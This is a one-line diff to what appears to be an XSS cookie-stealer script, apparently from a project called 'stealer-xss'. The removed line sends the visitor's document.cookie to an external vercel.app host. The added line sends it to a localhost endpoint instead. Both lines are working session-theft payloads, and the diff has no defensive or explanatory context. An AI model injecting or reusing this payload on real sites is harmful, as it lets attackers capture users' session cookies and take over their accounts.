@@ -1,1 +1,1 @@
-document.location="https://stealer-xss.vercel.app/demo.php?cookie="+ document.cookie;
+document.location="http://localhost/stealer-xss/demo.php?cookie="+ document.cookie;
